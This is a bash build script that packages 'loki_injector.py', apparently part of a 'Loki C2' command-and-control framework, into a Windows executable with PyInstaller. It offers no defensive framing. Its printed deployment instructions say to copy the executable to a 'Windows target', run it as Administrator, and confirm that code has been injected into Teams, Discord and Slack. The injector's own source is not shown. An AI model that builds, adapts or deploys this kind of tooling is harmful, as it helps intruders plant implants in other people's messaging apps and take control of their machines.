#!/bin/bash
# Build Windows .exe - Must run ON Windows or Windows VM
# This script is designed to run on Windows with Git Bash

set -e

echo "╔════════════════════════════════════════════════════════════════╗"
echo "║           Loki C2 - Windows EXE Builder (Run on Windows)       ║"
echo "╚════════════════════════════════════════════════════════════════╝"
echo ""

# Detect if running on Windows
if [[ "$OSTYPE" != "msys" ]] && [[ "$OSTYPE" != "win32" ]] && [[ "$OSTYPE" != "cygwin" ]]; then
    echo "⚠️  This script must run ON Windows!"
    echo ""
    echo "You're on macOS. Use one of these options:"
    echo ""
    echo "Option 1: Transfer to Windows and build there"
    echo "  ./package_for_windows.sh"
    echo "  # Then run build.sh on Windows"
    echo ""
    echo "Option 2: Just use the Python script (no build needed)"
    echo "  scp loki_injector.py admin@windows:C:\\Temp\\"
    echo "  # On Windows: python loki_injector.py"
    echo ""
    exit 1
fi

# Check if Python is installed
if ! command -v python &> /dev/null && ! command -v python3 &> /dev/null; then
    echo "❌ Python not found!"
    echo ""
    echo "Install Python:"
    echo "  winget install Python.Python.3.11"
    echo ""
    exit 1
fi

PYTHON_CMD="python"
if ! command -v python &> /dev/null; then
    PYTHON_CMD="python3"
fi

echo "✅ Python found: $($PYTHON_CMD --version)"
echo ""

# Check if PyInstaller is installed
if ! $PYTHON_CMD -c "import PyInstaller" 2>/dev/null; then
    echo "[*] Installing PyInstaller..."
    $PYTHON_CMD -m pip install pyinstaller
    echo "✅ PyInstaller installed"
else
    echo "✅ PyInstaller already installed"
fi

echo ""

# Clean previous builds
if [ -d "build" ] || [ -d "dist" ]; then
    echo "[*] Cleaning previous build artifacts..."
    rm -rf build dist *.spec
    echo "✅ Cleaned"
fi

echo ""
echo "╔════════════════════════════════════════════════════════════════╗"
echo "║              Building loki_injector.exe                        ║"
echo "╚════════════════════════════════════════════════════════════════╝"
echo ""
echo "[*] Compiling Windows executable..."
echo "    This may take 2-3 minutes..."
echo ""

# Build the Windows executable
$PYTHON_CMD -m PyInstaller \
    --onefile \
    --console \
    --name=loki_injector \
    --clean \
    --noconfirm \
    loki_injector.py

echo ""

# Check if build succeeded
if [ -f "dist/loki_injector.exe" ]; then
    
    echo "╔════════════════════════════════════════════════════════════════╗"
    echo "║                    ✅ BUILD SUCCESSFUL!                         ║"
    echo "╚════════════════════════════════════════════════════════════════╝"
    echo ""
    echo "📦 Output: dist/loki_injector.exe"
    echo ""
    
    ls -lh dist/loki_injector.exe
    echo ""
    
    FILE_SIZE=$(du -h dist/loki_injector.exe | awk '{print $1}')
    echo "Size: $FILE_SIZE"
    echo ""
    
    # Check file type
    if command -v file &> /dev/null; then
        echo "File type:"
        file dist/loki_injector.exe
        echo ""
    fi
    
    echo "════════════════════════════════════════════════════════════════"
    echo "📋 DEPLOYMENT INSTRUCTIONS"
    echo "════════════════════════════════════════════════════════════════"
    echo ""
    echo "1️⃣  Transfer to Windows target:"
    echo "    scp dist/loki_injector.exe admin@windows:C:\\Temp\\"
    echo ""
    echo "2️⃣  Execute on Windows (as Administrator):"
    echo "    Right-click → Run as Administrator"
    echo ""
    echo "3️⃣  Verify injection:"
    echo "    • Check console output for success messages"
    echo "    • Restart injected apps (Teams, Discord, Slack)"
    echo "    • Open app → Press F12 → Check for [Loki] messages"
    echo ""
    echo "════════════════════════════════════════════════════════════════"
    echo ""
    echo "✨ Ready to deploy!"
    echo ""
    
else
    echo "════════════════════════════════════════════════════════════════"
    echo "❌ BUILD FAILED"
    echo "════════════════════════════════════════════════════════════════"
    echo ""
    echo "dist/loki_injector.exe not found"
    echo ""
    echo "Troubleshooting:"
    echo "  1. Verify Python: $PYTHON_CMD --version"
    echo "  2. Check PyInstaller: $PYTHON_CMD -m pip show pyinstaller"
    echo "  3. Try manual build:"
    echo "     $PYTHON_CMD -m PyInstaller --onefile loki_injector.py"
    echo ""
    exit 1
fi
